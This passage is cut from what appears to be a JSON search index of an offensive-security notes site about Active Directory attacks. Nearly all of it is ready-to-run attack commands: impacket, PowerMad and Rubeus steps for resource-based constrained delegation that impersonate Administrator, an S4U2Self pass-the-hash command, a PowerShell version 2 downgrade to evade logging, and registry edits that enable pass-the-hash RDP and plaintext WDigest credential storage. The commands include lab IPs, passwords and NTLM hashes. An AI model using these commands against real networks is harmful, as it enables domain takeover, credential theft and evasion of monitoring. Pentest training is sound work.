<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> is set on account we control <pre><code>nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#with-impacket","title":"With impacket","text":"<p>Add computer you control <pre><code>impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Megaman!1' -dc-ip 192.168.0.100 its-piemonte.local/tantani:'AAAAaaaa!1'\n</code></pre> example with hash <pre><code>impacket-addcomputer -computer-name 'rbcd$' -computer-pass 'Password123!' -dc-ip 192.168.146.175 resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Configure delegation rights <pre><code>impacket-rbcd -delegate-to 'its-dc1$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write its-piemonte/tantani:'AAAAaaaa!1'\n</code></pre> Example with hash <pre><code>impacket-rbcd -delegate-to 'RESOURCEDC$' -delegate-from 'rbcd$' -dc-ip 192.168.146.175 -action write resourced.local/L.Livingstone -hashes :19a3a7550ce8c505c2d46b5e39d6f808\n</code></pre> Request ticket for admin <pre><code>impacket-getST -spn cifs/its-dc1.its-piemonte.local -impersonate Administrator -dc-ip 192.168.0.100 its-piemonte.local/rbcd-test:'Megaman!1'\n</code></pre> another example <pre><code>impacket-getST -spn cifs/RESOURCEDC.resourced.local -impersonate Administrator -dc-ip 192.168.146.175 resourced.local/rbcd:'Password123!'\n</code></pre> auth with ccache <pre><code>export KRB5CCNAME=Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache\n</code></pre> PSEXEC IN <pre><code>impacket-psexec Administrator@resourced.local -k -no-pass -dc-ip 192.168.146.175\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#windows","title":"Windows","text":"<p>Windows PowerMad has a cmdlet to let us create machine accounts: <pre><code>New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)\n</code></pre> Configure rights (with default AD powershell module) <pre><code>Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$\n</code></pre> use rubeus <pre><code># get AES:\nRubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local\n# get only RC4:\nRubeus.exe hash /password:Baudy16!1\n</code></pre></p> <pre><code>Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt\n</code></pre> <p>Convert to auth ticket <pre><code>impacket-ticketConverter rubeusTicket.kirbi impacketTicket.ccache\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/5.%20Lateral%20Movement/Service%20for%20User%20to%20Self/","title":"Service for User to Self","text":"<p>Get local admin with machine accounts via s4u2self <pre><code>nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self\n</code></pre></p>","tags":["S4U2Proxy","S4U2Self","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/6.%20Defense%20Evasion/Powershell%20Downgrade/","title":"Powershell Downgrade","text":"<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. We can attempt to enable Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. <pre><code>powershell.exe -version 2\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/","title":"Disable Restricted Admin Mode","text":"<p>To RDP with a hash, you must enable restricted admin mode via registry <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/","title":"Enable plaintext wdigest","text":"<p>run powershell with admin rights <pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n</code></pre> <pre><code>gpupdate /force\n</code></pre> Reboot box</p>","tags":["AD"]}]}